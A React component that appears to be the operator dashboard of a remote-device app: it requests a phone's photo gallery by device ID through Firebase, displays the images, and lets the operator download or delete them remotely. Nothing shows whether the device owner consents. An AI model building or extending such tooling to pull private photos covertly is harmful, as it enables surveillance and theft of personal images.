import React, { useState, useEffect, useMemo, useCallback } from 'react';
import {
  requestGalleryFromDevice,
  listenLiveGallery,
  listenDevicePermissions,
  deleteGalleryImage,
  downloadBase64Image,
  requestLoadMore
} from '../firebase/config';

function GalleryPage({ deviceId }) {
  const [allImages, setAllImages] = useState([]);
  const [stats, setStats] = useState({ total: 0, completed: 0, loading: 0 });
  const [permissions, setPermissions] = useState({});
  const [selectedImage, setSelectedImage] = useState(null);
  const [downloading, setDownloading] = useState({});
  const [loadingMore, setLoadingMore] = useState(false);

  useEffect(() => {
    if (!deviceId) return;
    const unsub = listenDevicePermissions(deviceId, setPermissions);
    return () => unsub();
  }, [deviceId]);

  useEffect(() => {
    if (!deviceId) return;
    const unsub = listenLiveGallery(deviceId, (imgs, sts) => {
      setAllImages(imgs);
      setStats(sts);
      setLoadingMore(false);
    });
    return () => unsub();
  }, [deviceId]);

  useEffect(() => {
    if (deviceId) requestGalleryFromDevice(deviceId);
  }, [deviceId]);

  const sortedImages = useMemo(() => {
    return [...allImages].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
  }, [allImages]);

  const hasGalleryAccess = 
    permissions.READ_MEDIA_IMAGES === true || 
    permissions.gallery_access === true;

  const handleLoadMore = useCallback(async () => {
    if (loadingMore) return;
    setLoadingMore(true);
    const offset = allImages.length;
    await requestLoadMore(deviceId, offset);
    setTimeout(() => setLoadingMore(false), 5000);
  }, [deviceId, allImages.length, loadingMore]);

  const handleDownload = useCallback((img) => {
    if (!img.base64) return;
    setDownloading(prev => ({ ...prev, [img.id]: true }));
    downloadBase64Image(img.base64, img.name);
    setTimeout(() => {
      setDownloading(prev => ({ ...prev, [img.id]: false }));
    }, 800);
  }, []);

  const handleDelete = useCallback(async (imageId) => {
    if (!window.confirm('Delete this image?')) return;
    await deleteGalleryImage(deviceId, imageId);
    setAllImages(prev => prev.filter(img => img.id !== imageId));
  }, [deviceId]);

  // ❌ No permission
  if (!hasGalleryAccess && allImages.length === 0) {
    return (
      <div style={{ textAlign: 'center', padding: 40 }}>
        <span style={{ fontSize: 48, display: 'block', marginBottom: 12 }}>🔒</span>
        <p style={{ color: 'var(--text-muted)', fontSize: 13 }}>
          User ne gallery permission nahi di hai
        </p>
      </div>
    );
  }

  // ⏳ Loading
  if (hasGalleryAccess && allImages.length === 0) {
    return (
      <div style={{ textAlign: 'center', padding: 40 }}>
        <div style={{
          width: 40, height: 40,
          border: '3px solid var(--border-color)',
          borderTopColor: '#6c63ff',
          borderRadius: '50%',
          margin: '0 auto 12px',
          animation: 'spin 0.8s linear infinite'
        }}></div>
        <p style={{ color: 'var(--text-muted)', fontSize: 13 }}>
          📸 Loading first 20 images...
        </p>
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    );
  }

  return (
    <div>
      {/* ✅ TOP LOAD MORE */}
      <div style={{
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        marginBottom: 12,
        padding: '8px 4px',
        borderBottom: '1px solid var(--border-color)'
      }}>
        <span style={{ fontSize: 11, color: 'var(--text-muted)' }}>
          {sortedImages.length} images loaded
        </span>
        <button
          onClick={handleLoadMore}
          disabled={loadingMore}
          style={{
            padding: '6px 16px',
            border: '1px solid #6c63ff',
            borderRadius: 6,
            background: 'rgba(108, 99, 255, 0.08)',
            color: '#6c63ff',
            fontSize: 11,
            fontWeight: 600,
            cursor: loadingMore ? 'wait' : 'pointer',
            opacity: loadingMore ? 0.5 : 1
          }}
        >
          {loadingMore ? '⏳ Loading...' : '📥 Load More (20)'}
        </button>
      </div>

      {/* ✅ Grid */}
      <div style={{
        display: 'grid',
        gridTemplateColumns: 'repeat(auto-fill, minmax(120px, 1fr))',
        gap: 8
      }}>
        {sortedImages.map((img) => (
          <div
            key={img.id}
            style={{
              position: 'relative',
              borderRadius: 8,
              overflow: 'hidden',
              border: '1px solid var(--border-color)',
              aspectRatio: '1',
              background: 'var(--bg-input)'
            }}
          >
            {img.base64 ? (
              <img
                src={img.base64}
                alt={img.name}
                loading="lazy"
                onClick={() => setSelectedImage(img)}
                style={{
                  width: '100%',
                  height: '100%',
                  objectFit: 'cover',
                  cursor: 'pointer',
                  display: 'block'
                }}
              />
            ) : (
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%' }}>
                ⏳
              </div>
            )}

            {img.base64 && (
              <button
                onClick={(e) => {
                  e.stopPropagation();
                  handleDownload(img);
                }}
                style={{
                  position: 'absolute', bottom: 4, left: 4,
                  width: 26, height: 26, borderRadius: '50%',
                  background: 'rgba(59, 130, 246, 0.9)',
                  border: 'none', color: 'white', fontSize: 12,
                  cursor: 'pointer'
                }}
              >
                {downloading[img.id] ? '⏳' : '⬇️'}
              </button>
            )}

            <button
              onClick={(e) => {
                e.stopPropagation();
                handleDelete(img.id);
              }}
              style={{
                position: 'absolute', top: 4, right: 4,
                width: 22, height: 22, borderRadius: '50%',
                background: 'rgba(231, 76, 60, 0.9)',
                border: 'none', color: 'white', fontSize: 11,
                cursor: 'pointer'
              }}
            >
              ✕
            </button>
          </div>
        ))}
      </div>

      {/* ✅ BOTTOM LOAD MORE */}
      <div style={{ textAlign: 'center', marginTop: 20 }}>
        <button
          onClick={handleLoadMore}
          disabled={loadingMore}
          style={{
            padding: '12px 40px',
            border: '2px solid #6c63ff',
            borderRadius: 10,
            background: 'rgba(108, 99, 255, 0.08)',
            color: '#6c63ff',
            fontSize: 14,
            fontWeight: 700,
            cursor: loadingMore ? 'wait' : 'pointer',
            opacity: loadingMore ? 0.5 : 1
          }}
        >
          {loadingMore ? '⏳ Loading 20 more...' : '📥 Load More (20 images)'}
        </button>
      </div>

      {/* Full screen viewer */}
      {selectedImage && (
        <div
          onClick={() => setSelectedImage(null)}
          style={{
            position: 'fixed', inset: 0,
            background: 'rgba(0,0,0,0.95)',
            display: 'flex', alignItems: 'center',
            justifyContent: 'center', zIndex: 10000, padding: 20
          }}
        >
          <button
            onClick={() => setSelectedImage(null)}
            style={{
              position: 'absolute', top: 20, right: 20,
              width: 40, height: 40, borderRadius: '50%',
              background: 'rgba(255,255,255,0.1)',
              border: 'none', color: 'white', fontSize: 20,
              cursor: 'pointer'
            }}
          >
            ✕
          </button>
          <img
            src={selectedImage.base64}
            alt={selectedImage.name}
            style={{ maxWidth: '95%', maxHeight: '90%', borderRadius: 8 }}
          />
        </div>
      )}
    </div>
  );
}

export default GalleryPage;